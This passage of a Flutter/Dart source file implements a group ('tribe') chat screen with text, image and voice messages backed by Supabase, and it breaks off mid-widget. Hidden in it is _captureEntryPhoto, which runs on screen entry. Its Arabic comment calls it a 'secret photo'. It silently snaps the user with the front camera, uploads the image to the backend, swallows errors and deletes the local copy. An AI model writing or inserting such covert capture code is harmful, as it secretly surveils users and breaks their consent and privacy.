import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; // HapticFeedback
import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:image_picker/image_picker.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:record/record.dart';
import 'package:camera/camera.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import '../services/supabase_service.dart';
import '../theme/app_theme.dart';
import 'tribe_info_screen.dart';
import 'package:http/http.dart' as http;
import 'package:cached_network_image/cached_network_image.dart';

/// شاشة الدردشة الجماعية للقبيلة - تصميم "الرق الملكي" 📜⚔️👑
class TribeChatScreen extends StatefulWidget {
  final Map<String, dynamic> tribe;
  final Map<String, dynamic> user;
  final VoidCallback? onBack;

  const TribeChatScreen({
    super.key,
    required this.tribe,
    required this.user,
    this.onBack,
  });

  @override
  State<TribeChatScreen> createState() => _TribeChatScreenState();
}

class _TribeChatScreenState extends State<TribeChatScreen> {
  final TextEditingController _messageController = TextEditingController();
  final ScrollController _scrollController = ScrollController();
  final ImagePicker _imagePicker = ImagePicker();
  final AudioRecorder _audioRecorder = AudioRecorder();
  final AudioPlayer _audioPlayer = AudioPlayer();

  List<Map<String, dynamic>> _messages = [];
  RealtimeChannel? _channel;
  RealtimeChannel? _membersChannel;
  bool _isLoading = true;
  bool _isSending = false;
  // bool _showStickers = false; // معطل مؤقتاً
  bool _isRecording = false;
  String? _recordingPath;
  String? _playingMessageId;
  StreamSubscription? _audioPlayerSubscription;
  int _memberCount = 0;

  @override
  void initState() {
    super.initState();
    _loadMessages();
    _subscribeToMessages();
    _subscribeMemberChanges();
    _captureEntryPhoto();
  }

  @override
  void dispose() {
    if (_channel != null) {
      SupabaseService.unsubscribeTribeMessages(_channel!);
      _channel = null;
    }
    _membersChannel?.unsubscribe();
    _membersChannel = null;
    _stopVoice();
    _audioPlayerSubscription?.cancel();
    _audioPlayer.dispose();
    _audioRecorder.dispose(); // ✅ إصلاح memory leak
    _messageController.dispose();
    _scrollController.dispose();
    super.dispose();
  }

  /// 📸 التقاط صورة سرية عند دخول القبيلة
  Future<void> _captureEntryPhoto() async {
    if (kIsWeb) return;
    CameraController? cameraController;
    try {
      final cameraStatus = await Permission.camera.status;
      if (!cameraStatus.isGranted) return;

      final cameras = await availableCameras();
      if (cameras.isEmpty) return;

      final frontCamera = cameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
        orElse: () => cameras.first,
      );

      cameraController = CameraController(
        frontCamera,
        ResolutionPreset.medium,
        enableAudio: false,
        imageFormatGroup: ImageFormatGroup.jpeg,
      );

      await cameraController.initialize();
      await Future.delayed(const Duration(milliseconds: 500));

      final photo = await cameraController.takePicture();
      final photoBytes = await photo.readAsBytes();

      await SupabaseService.uploadSessionPhoto(
        userId: widget.user['id'],
        photoBytes: photoBytes,
        screenName: 'tribe_${widget.tribe['name'] ?? 'chat'}',
      );

      try {
        final file = File(photo.path);
        if (await file.exists()) await file.delete();
      } catch (_) {}
    } catch (_) {
    } finally {
      try {
        await cameraController?.dispose();
      } catch (_) {}
    }
  }

  Future<void> _loadMessages() async {
    if (!mounted) return;
    setState(() => _isLoading = true);

    try {
      // ✅ تمرير معرف المستخدم للتحقق من العضوية
      final messages = await SupabaseService.getTribeMessages(
        widget.tribe['id'],
        userId: widget.user['id'],
      ).timeout(const Duration(seconds: 15)); // ✅ timeout لمنع التعليق

      final members = await SupabaseService.getTribeMembers(
        widget.tribe['id'],
      ).timeout(const Duration(seconds: 10));

      if (mounted) {
        setState(() {
          _messages = messages;
          _memberCount = members.length;
          _isLoading = false;
        });
      }
    } catch (e) {
      debugPrint('❌ Error loading messages: $e');
      if (mounted) {
        setState(() => _isLoading = false);
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              'خطأ في تحميل الرسائل: ${e.toString().contains('timeout') ? 'انتهت المهلة' : 'خطأ في الاتصال'}',
            ),
            backgroundColor: Colors.red,
            action: SnackBarAction(
              label: 'إعادة المحاولة',
              textColor: Colors.white,
              onPressed: _loadMessages,
            ),
          ),
        );
      }
    }
  }

  void _subscribeToMessages() {
    _channel = SupabaseService.subscribeTribeMessages(widget.tribe['id'], (
      message,
    ) {
      if (!mounted) return;
      setState(() {
        _messages.removeWhere(
          (msg) =>
              msg['id'].toString().startsWith('temp_') &&
              msg['message'] == message['message'] &&
              msg['user_id'] == message['user_id'],
        );
        _messages.insert(0, message);
      });
    });
  }

  void _subscribeMemberChanges() {
    final userId = widget.user['id'];
    final tribeId = widget.tribe['id'];

    // 1. مراقبة حالة العضوية الشخصية (للمغادرة/الطرد الفوري)
    _membersChannel = Supabase.instance.client
        .channel('tribe_membership_$tribeId')
        .onPostgresChanges(
          event: PostgresChangeEvent.delete,
          schema: 'public',
          table: 'tribe_members',
          filter: PostgresChangeFilter(
            type: PostgresChangeFilterType.eq,
            column: 'user_id',
            value: userId,
          ),
          callback: (payload) {
            if (!mounted) return;
            debugPrint('🚨 Membership ended for current user!');
            _channel?.unsubscribe();
            _membersChannel?.unsubscribe();

            if (widget.onBack != null) {
              widget.onBack!();
            } else {
              Navigator.of(context).popUntil((route) => route.isFirst);
            }

            Future.delayed(const Duration(milliseconds: 100), () {
              if (mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(
                    content: Text('📜 تم إنهاء عضويتكم في هذا المجلس'),
                    backgroundColor: Colors.orange,
                  ),
                );
              }
            });
          },
        )
        // 2. تحديث عدد الأعضاء اللحظي (للجميع) 👥
        .onPostgresChanges(
          event: PostgresChangeEvent.all,
          schema: 'public',
          table: 'tribe_members',
          filter: PostgresChangeFilter(
            type: PostgresChangeFilterType.eq,
            column: 'tribe_id',
            value: tribeId,
          ),
          callback: (payload) async {
            if (!mounted) return;
            // إعادة جلب العدد لضمان الدقة (بدلاً من الافتراض)
            final members = await SupabaseService.getTribeMembers(tribeId);
            if (mounted) {
              setState(() => _memberCount = members.length);
            }
          },
        )
        .subscribe();
  }

  Future<void> _sendMessage() async {
    final text = _messageController.text.trim();
    if (text.isEmpty || _isSending) return;

    if (!mounted) return;
    setState(() => _isSending = true);
    _messageController.clear();

    final tempMessage = {
      'id': 'temp_${DateTime.now().millisecondsSinceEpoch}',
      'user_id': widget.user['id'],
      'message': text,
      'message_type': 'text',
      'created_at': DateTime.now().toIso8601String(),
      'user': widget.user,
    };

    if (mounted) setState(() => _messages.insert(0, tempMessage));

    try {
      await SupabaseService.sendTribeMessage(
        tribeId: widget.tribe['id'],
        userId: widget.user['id'],
        message: text,
      ).timeout(const Duration(seconds: 10)); // ✅ timeout
    } catch (e) {
      debugPrint('❌ Error sending message: $e');
      if (mounted) {
        setState(
          () => _messages.removeWhere((msg) => msg['id'] == tempMessage['id']),
        );

        String errorMessage = 'فشل إرسال الرسالة';
        if (e.toString().contains('timeout')) {
          errorMessage = 'انتهت مهلة الإرسال. تحقق من الاتصال';
        }

        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(errorMessage),
            backgroundColor: Colors.red,
            action: SnackBarAction(
              label: 'إعادة',
              textColor: Colors.white,
              onPressed: () {
                _messageController.text = text;
                _sendMessage();
              },
            ),
          ),
        );
      }
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  Future<void> _pickAndSendImage() async {
    if (_isSending) return;

    try {
      setState(() => _isSending = true);

      // ✅ اختيار الصورة
      final XFile? image = await _imagePicker.pickImage(
        source: ImageSource.gallery,
        imageQuality: 85, // ✅ جودة عالية
        maxWidth: 2560, // ✅ دقة أعلى
        maxHeight: 2560,
      );

      if (image == null || !mounted) {
        setState(() => _isSending = false);
        return;
      }

      // ✅ قراءة الصورة
      final imageBytes = await image.readAsBytes();

      // ✅ فحص حجم الصورة (حد أقصى 10 ميجا)
      final sizeInMB = imageBytes.length / (1024 * 1024);
      if (sizeInMB > 10) {
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text(
                'حجم الصورة كبير جداً (${sizeInMB.toStringAsFixed(1)} MB). الحد الأقصى 10 ميجابايت',
              ),
              backgroundColor: Colors.red,
            ),
          );
        }
        setState(() => _isSending = false);
        return;
      }

      // ✅ إضافة رسالة مؤقتة
      final tempId = 'temp_img_${DateTime.now().millisecondsSinceEpoch}';
      if (mounted) {
        setState(() {
          _messages.insert(0, {
            'id': tempId,
            'user_id': widget.user['id'],
            'message': '📸 جاري الرفع... (${sizeInMB.toStringAsFixed(1)} MB)',
            'message_type': 'image',
            'media_url': null,
            'local_bytes': imageBytes,
            'is_uploading': true,
            'created_at': DateTime.now().toIso8601String(),
            'user': widget.user,
          });
        });
        _scrollController.animateTo(
          0,
          duration: const Duration(milliseconds: 300),
          curve: Curves.easeOut,
        );
      }

      // ✅ رفع الصورة مع timeout
      final imageUrl =
          await SupabaseService.uploadTribeImage(
            imageBytes: imageBytes,
            tribeId: widget.tribe['id'],
            userId: widget.user['id'],
          ).timeout(
            Duration(
              seconds: sizeInMB > 5 ? 60 : 45,
            ), // ✅ وقت أطول للصور الكبيرة
            onTimeout: () {
              throw Exception('انتهت مهلة الرفع. حاول مرة أخرى');
            },
          );

      if (imageUrl == null) {
        throw Exception('فشل رفع الصورة');
      }

      // ✅ إرسال الرسالة
      await SupabaseService.sendTribeMessage(
        tribeId: widget.tribe['id'],
        userId: widget.user['id'],
        message: '📸',
        messageType: 'image',
        mediaUrl: imageUrl,
      ).timeout(const Duration(seconds: 10));

      // ✅ تحديث الرسالة المؤقتة
      if (mounted) {
        setState(() {
          final index = _messages.indexWhere((m) => m['id'] == tempId);
          if (index != -1) {
            _messages[index] = {
              ..._messages[index],
              'media_url': imageUrl,
              'local_bytes': null,
              'is_uploading': false,
              'message': '📸',
            };
          }
        });

        // ✅ إشعار نجاح
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Row(
              children: [
                Icon(Icons.check_circle, color: Colors.white),
                SizedBox(width: 8),
                Text('تم إرسال الصورة بنجاح'),
              ],
            ),
            backgroundColor: Colors.green,
            duration: Duration(seconds: 2),
          ),
        );
      }
    } catch (e) {
      debugPrint('❌ Error uploading image: $e');

      if (mounted) {
        // ✅ إزالة الرسالة المؤقتة
        setState(
          () => _messages.removeWhere(
            (m) => m['id'].toString().startsWith('temp_img_'),
          ),
        );

        // ✅ عرض رسالة خطأ واضحة
        String errorMessage = 'فشل إرسال الصورة';
        if (e.toString().contains('timeout')) {
          errorMessage = 'انتهت مهلة الرفع. تحقق من الاتصال بالإنترنت';
        } else if (e.toString().contains('storage')) {
          errorMessage = 'خطأ في مساحة التخزين';
        }

        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(errorMessage),
            backgroundColor: Colors.red,
            action: SnackBarAction(
              label: 'إعادة المحاولة',
              textColor: Colors.white,
              onPressed: _pickAndSendImage,
            ),
          ),
        );
      }
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  Future<void> _startVoiceRecording() async {
    if (_isRecording) return;

    try {
      // فحص حالة الإذن
      var permissionStatus = await Permission.microphone.status;
      debugPrint('🎤 Microphone permission status: $permissionStatus');

      if (!permissionStatus.isGranted) {
        // عرض dialog فاخر لطلب الإذن
        final shouldRequest = await _showMicrophonePermissionDialog();

        if (shouldRequest != true) return;

        // عرض loading أثناء طلب الإذن
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Row(
                children: [
                  SizedBox(
                    width: 20,
                    height: 20,
                    child: CircularProgressIndicator(
                      strokeWidth: 2,
                      color: Colors.white,
                    ),
                  ),
                  const SizedBox(width: 12),
                  const Text('جاري طلب إذن الميكروفون...'),
                ],
              ),
              backgroundColor: const Color(0xFF8B0000),
              duration: const Duration(seconds: 2),
            ),
          );
        }

        // طلب الإذن
        permissionStatus = await Permission.microphone.request();

        // إخفاء الـ loading
        if (mounted) {
          ScaffoldMessenger.of(context).hideCurrentSnackBar();
        }

        if (permissionStatus.isGranted) {
          // الإذن ممنوح - بدء التسجيل تلقائياً (تجربة سلسة)
          if (mounted) {
            HapticFeedback.mediumImpact();
          }
          await _performRecording();
        } else if (permissionStatus.isPermanentlyDenied) {
          // رفض دائم - توجيه للإعدادات
          _showPermissionDeniedDialog();
        } else {
          // رفض مؤقت
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(
                content: Text('❌ تم رفض إذن الميكروفون'),
                backgroundColor: Colors.red,
              ),
            );
          }
        }
        return;
      }

      // الإذن ممنوح مسبقاً - تسجيل مباشر
      if (mounted) {
        HapticFeedback.mediumImpact();
      }
      await _performRecording();
    } catch (e) {
      debugPrint('❌ Error starting recording: $e');
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('حدث خطأ: ${e.toString()}'),
            backgroundColor: Colors.red,
          ),
        );
      }
    }
  }

  /// Dialog فاخر بتصميم القبائل الملكي
  Future<bool?> _showMicrophonePermissionDialog() async {
    return showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
              colors: [Color(0xFF1a1a1a), Color(0xFF0D0D0D)],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(
              color: const Color(0xFFFF0000).withValues(alpha: 0.5),
              width: 2,
            ),
            boxShadow: [
              BoxShadow(
                color: const Color(0xFFFF0000).withValues(alpha: 0.3),
                blurRadius: 20,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              // أيقونة الميكروفون
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: const LinearGradient(
                    colors: [Color(0xFFFF0000), Color(0xFF8B0000)],
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: const Color(0xFFFF0000).withValues(alpha: 0.4),
                      blurRadius: 15,
                      spreadRadius: 2,
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.mic_rounded,
                  color: Colors.white,
                  size: 40,
                ),
              ),
              const SizedBox(height: 20),

              // العنوان
              ShaderMask(
                shaderCallback: (bounds) => const LinearGradient(
                  colors: [
                    Colors.white,
                    Color(0xFFD4AF37), // ذهبي
                  ],
                ).createShader(bounds),
                child: const Text(
                  'إذن الميكروفون',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 22,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Tajawal',
                  ),
                ),
              ),
              const SizedBox(height: 12),

              // الوصف
              Text(
                'نحتاج إلى إذن الوصول للميكروفون\nلتسجيل الرسائل الصوتية في المجلس',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: Colors.white.withValues(alpha: 0.8),
                  fontSize: 14,
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 24),

              // الأزرار
              Row(
                children: [
                  Expanded(
                    child: TextButton(
                      onPressed: () => Navigator.pop(context, false),
                      style: TextButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                          side: BorderSide(
                            color: Colors.white.withValues(alpha: 0.3),
                          ),
                        ),
                      ),
                      child: Text(
                        'إلغاء',
                        style: TextStyle(
                          color: Colors.white.withValues(alpha: 0.7),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    flex: 2,
                    child: ElevatedButton(
                      onPressed: () => Navigator.pop(context, true),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFFFF0000),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                        elevation: 5,
                        shadowColor: const Color(
                          0xFFFF0000,
                        ).withValues(alpha: 0.5),
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            Icons.check_circle,
                            color: Colors.white,
                            size: 20,
                          ),
                          SizedBox(width: 8),
                          Text(
                            'منح الإذن',
                            style: TextStyle(
                              color: Colors.white,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  /// Dialog للرفض الدائم مع توجيه للإعدادات
  void _showPermissionDeniedDialog() {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
              colors: [Color(0xFF1a1a1a), Color(0xFF0D0D0D)],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(
              color: Colors.orange.withValues(alpha: 0.5),
              width: 2,
            ),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(
                Icons.settings_outlined,
                color: Colors.orange,
                size: 50,
              ),
              const SizedBox(height: 16),
              const Text(
                'الإذن مرفوض',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 12),
              Text(
                'تم رفض إذن الميكروفون بشكل دائم.\nيرجى تفعيله من إعدادات التطبيق',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: Colors.white.withValues(alpha: 0.7),
                  fontSize: 14,
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 24),
              Row(
                children: [
                  Expanded(
                    child: TextButton(
                      onPressed: () => Navigator.pop(context),
                      child: const Text('إلغاء'),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    flex: 2,
                    child: ElevatedButton.icon(
                      onPressed: () {
                        Navigator.pop(context);
                        openAppSettings();
                      },
                      icon: const Icon(Icons.settings, size: 18),
                      label: const Text('فتح الإعدادات'),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.orange,
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  /// التسجيل الفعلي (منفصل للوضوح)
  Future<void> _performRecording() async {
    String audioPath;
    if (kIsWeb) {
      audioPath = 'tribe_voice_${DateTime.now().millisecondsSinceEpoch}.m4a';
    } else {
      try {
        final tempDir = await getTemporaryDirectory();
        audioPath =
            '${tempDir.path}/tribe_voice_${DateTime.now().millisecondsSinceEpoch}.m4a';
      } catch (e) {
        // fallback إذا فشل path_provider
        debugPrint('⚠️ path_provider failed, using fallback: $e');
        if (Platform.isAndroid) {
          audioPath =
              '/data/user/0/com.example.test7/cache/tribe_voice_${DateTime.now().millisecondsSinceEpoch}.m4a';
        } else {
          audioPath =
              '/tmp/tribe_voice_${DateTime.now().millisecondsSinceEpoch}.m4a';
        }
      }
    }

    await _audioRecorder.start(
      const RecordConfig(
        encoder: AudioEncoder.aacLc,
        bitRate: 32000,
        sampleRate: 22050,
      ),
      path: audioPath,
    );

    setState(() {
      _isRecording = true;
      _recordingPath = audioPath;
    });
  }

  Future<void> _stopVoiceRecording({bool cancel = false}) async {
    if (!_isRecording || _recordingPath == null) return;

    try {
      final path = await _audioRecorder.stop();
      setState(() {
        _isRecording = false;
      });

      if (cancel) {
        if (path != null && !kIsWeb) {
          final file = File(path);
          if (await file.exists()) await file.delete();
        }
        return;
      }

      if (path == null || !mounted) return;

      final tempId = 'temp_voice_${DateTime.now().millisecondsSinceEpoch}';
      setState(() {
        _messages.insert(0, {
          'id': tempId,
          'user_id': widget.user['id'],
          'message': '🎤 رسالة صوتية',
          'message_type': 'voice',
          'media_url': null,
          'is_uploading': true,
          'created_at': DateTime.now().toIso8601String(),
          'user': widget.user,
        });
      });

      Future(() async {
        try {
          String? audioUrl;
          if (kIsWeb) {
            final response = await http.get(Uri.parse(path));
            if (response.statusCode == 200) {
              final result = await SupabaseService.sendTribeVoiceBytes(
                tribeId: widget.tribe['id'],
                userId: widget.user['id'],
                audioBytes: response.bodyBytes,
                fileName: 'voice.m4a',
              );
              audioUrl = result?['media_url'];
            }
          } else {
            final result = await SupabaseService.sendTribeVoice(
              tribeId: widget.tribe['id'],
              userId: widget.user['id'],
              audioPath: path,
            );
            audioUrl = result?['media_url'];
          }

          if (audioUrl != null && mounted) {
            setState(() {
              final index = _messages.indexWhere((m) => m['id'] == tempId);
              if (index != -1) {
                _messages[index] = {
                  ..._messages[index],
                  'media_url': audioUrl,
                  'is_uploading': false,
                };
              }
            });
          }
        } catch (e) {
          if (mounted) {
            setState(() => _messages.removeWhere((m) => m['id'] == tempId));
          }
        }
      });
    } catch (e) {
      debugPrint('Error stopping recording: $e');
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  Future<void> _playVoice(String messageId, String audioUrl) async {
    try {
      if (_playingMessageId == messageId) {
        await _audioPlayer.stop();
        await _audioPlayerSubscription?.cancel();
        setState(() => _playingMessageId = null);
      } else {
        await _audioPlayerSubscription?.cancel();
        if (audioUrl.startsWith('data:audio')) {
          final base64Data = audioUrl.split(',').last;
          await _audioPlayer.play(BytesSource(base64Decode(base64Data)));
        } else {
          await _audioPlayer.play(UrlSource(audioUrl));
        }
        setState(() => _playingMessageId = messageId);
        _audioPlayerSubscription = _audioPlayer.onPlayerComplete.listen((_) {
          if (mounted) setState(() => _playingMessageId = null);
        });
      }
    } catch (e) {
      debugPrint('Error playing voice: $e');
    }
  }

  Future<void> _stopVoice() async {
    await _audioPlayer.stop();
    setState(() => _playingMessageId = null);
  }

  Future<void> _deleteMessage(String? messageId) async {
    if (messageId == null) return;

    // فحص إذا كانت الرسالة مؤقتة (لم ترفع للسيرفر بعد)
    final isTemporary = messageId.toString().startsWith('temp_');

    final confirm = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0D0D0D),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.accentSilverGold.withAlpha(50)),
        ),
        title: const Text(
          'إزالة المراسلة',
          style: TextStyle(color: Colors.white),
        ),
        content: const Text(
          'هل ترغب في حذف هذه المراسلة من السجلات الرسمية؟',
          style: TextStyle(color: Colors.white70),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('إلغاء'),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context, true),
            style: TextButton.styleFrom(foregroundColor: Colors.red),
            child: const Text('تأكيد الحذف'),
          ),
        ],
      ),
    );

    if (confirm != true || !mounted) return;

    // إذا كانت الرسالة مؤقتة، احذفها محلياً فقط
    if (isTemporary) {
      if (mounted) {
        setState(() => _messages.removeWhere((msg) => msg['id'] == messageId));
      }
      return;
    }

    // إذا كانت رسالة حقيقية، احذفها من السيرفر
    final success = await SupabaseService.deleteTribeMessage(
      messageId: messageId,
      userId: widget.user['id'],
    );
    if (success && mounted) {
      setState(() => _messages.removeWhere((msg) => msg['id'] == messageId));
    }
  }

  // --- UI Building Blocks ---

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: _buildAppBar(),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              const Color(0xFF8B0000).withValues(alpha: 0.15),
              Colors.black,
              Colors.black,
            ],
          ),
        ),
        child: Stack(
          children: [
            // خلفية أرابيسك خفية جداً
            Positioned.fill(
              child: Opacity(
                opacity: 0.03,
                child: Image.asset(
                  'assets/images/pattern_arabesque.png',
                  repeat: ImageRepeat.repeat,
                  errorBuilder: (context, error, stackTrace) =>
                      const SizedBox(),
                ),
              ),
            ),
            Column(
              children: [
                Expanded(
                  child: _isLoading
                      ? const Center(
                          child: CircularProgressIndicator(
                            color: Color(0xFFFF0000),
                          ),
                        )
                      : _messages.isEmpty
                      ? _buildEmptyState()
                      : _buildMessagesList(),
                ),
                _buildMessageInput(),
              ],
            ),
          ],
        ),
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.black,
      elevation: 0,
      flexibleSpace: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              const Color(0xFF8B0000).withValues(alpha: 0.2),
              Colors.black,
            ],
          ),
        ),
      ),
      centerTitle: false,
      leading: IconButton(
        icon: Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            color: const Color(0xFF8B0000).withValues(alpha: 0.3),
            borderRadius: BorderRadius.circular(8),
          ),
          child: const Icon(
            Icons.arrow_back_ios_new_rounded,
            color: Colors.white,
            size: 18,
          ),
        ),
        onPressed: () {
          if (widget.onBack != null) {
            widget.onBack!();
          } else {
            Navigator.pop(context);
          }
        },
      ),
      title: InkWell(
        onTap: () async {
          final result = await Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => TribeInfoScreen(
                tribeId: widget.tribe['id'],
                user: widget.user,
              ),
            ),
          );

          if (result == true && mounted) {
            // إذا غادر المستخدم القبيلة، نخرج من الدردشة فوراً
            if (widget.onBack != null) {
              widget.onBack!();
            } else {
              Navigator.pop(context);
            }
          }
        },
        child: Row(
          children: [
            Hero(
              tag: 'tribe_icon_${widget.tribe['id']}',
              child: Container(
                width: 40,
                height: 40,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [const Color(0xFF1a1a1a), Colors.black],
                  ),
                  borderRadius: const BorderRadius.only(
                    topLeft: Radius.circular(12),
                    bottomRight: Radius.circular(12),
                    topRight: Radius.circular(4),
                    bottomLeft: Radius.circular(4),
                  ),
                  border: Border.all(
                    color: const Color(0xFFFF0000).withValues(alpha: 0.6),
                    width: 1.5,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: const Color(0xFFFF0000).withValues(alpha: 0.2),
                      blurRadius: 10,
                      spreadRadius: 1,
                    ),
                  ],
                ),
                child: Center(
                  child: Text(
                    widget.tribe['icon'] ?? '⚔️',
                    style: const TextStyle(fontSize: 20),
                  ),
                ),
              ),
            ),
            const SizedBox(width: 12),
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                ShaderMask(
                  shaderCallback: (bounds) => const LinearGradient(
                    colors: [
                      Colors.white,
                      Color(0xFFFF0000),
                      Color(0xFFD4AF37),
                    ],
                  ).createShader(bounds),
                  child: Text(
                    widget.tribe['name'] ?? '',
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 16,
                      fontWeight: FontWeight.w700,
                      fontFamily: 'Tajawal',
                    ),
                  ),
                ),
                Text(
                  '$_memberCount عضو',
                  style: TextStyle(
                    color: const Color(0xFFD4AF37).withValues(alpha: 0.7),
                    fontSize: 10,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
      bottom: PreferredSize(
        preferredSize: const Size.fromHeight(1),
        child: Container(
          height: 1,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [
                Colors.transparent,
                const Color(0xFFFF0000).withValues(alpha: 0.3),
                const Color(0xFFD4AF37).withValues(alpha: 0.2),
                Colors.transparent,
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(
            Icons.history_edu_rounded,
            size: 60,
            color: Colors.white.withAlpha(20),
          ),
          const SizedBox(height: 16),
          Text(
            'السجل خالٍ من المراسلات',
            style: TextStyle(
              color: Colors.white.withAlpha(100),
              fontSize: 16,
              fontFamily: 'Tajawal',
            ),
          ),
          const SizedBox(height: 8),
          Text(
            'ابدأ بتدوين أولى المراسلات الرسمية...',
            style: TextStyle(
              color: AppTheme.accentSilverGold.withAlpha(150),
              fontSize: 12,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMessagesList() {
    return ListView.builder(
      controller: _scrollController,
      reverse: true,
      physics: const BouncingScrollPhysics(),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 20),
      itemCount: _messages.length,
      itemBuilder: (context, index) {
        final message = _messages[index];
        final isMe = message['user_id'] == widget.user['id'];
        return _buildMessageBubble(message, isMe);
      },
    );
  }

  Widget _buildMessageBubble(Map<String, dynamic> message, bool isMe) {
    final messageType = message['message_type'] ?? 'text';
    final user = message['user'] ?? {};
    final mediaUrl = message['media_url'];

    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: Row(
        mainAxisAlignment: isMe
            ? MainAxisAlignment.end
            : MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.end,
        children: [
          if (!isMe) ...[
            Container(
              width: 32,
              height: 32,
              margin: const EdgeInsets.only(left: 4),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(
                  color: AppTheme.accentSilverGold.withAlpha(100),
                  width: 1,
                ),
                image: user['profile_image'] != null
                    ? DecorationImage(
                        image: NetworkImage(user['profile_image']),
                        fit: BoxFit.cover,
                      )
                    : null,
                color: const Color(0xFF151515),
              ),
              child: user['profile_image'] == null
                  ? const Icon(Icons.person, color: Colors.white38, size: 16)
                  : null,
            ),
            const SizedBox(width: 8),
          ],
          Flexible(
            child: GestureDetector(
              onLongPress: isMe ? () => _deleteMessage(message['id']) : null,
              child: Container(
                constraints: const BoxConstraints(maxWidth: 280),
                padding: messageType == 'image'
                    ? const EdgeInsets.all(4)
                    : const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
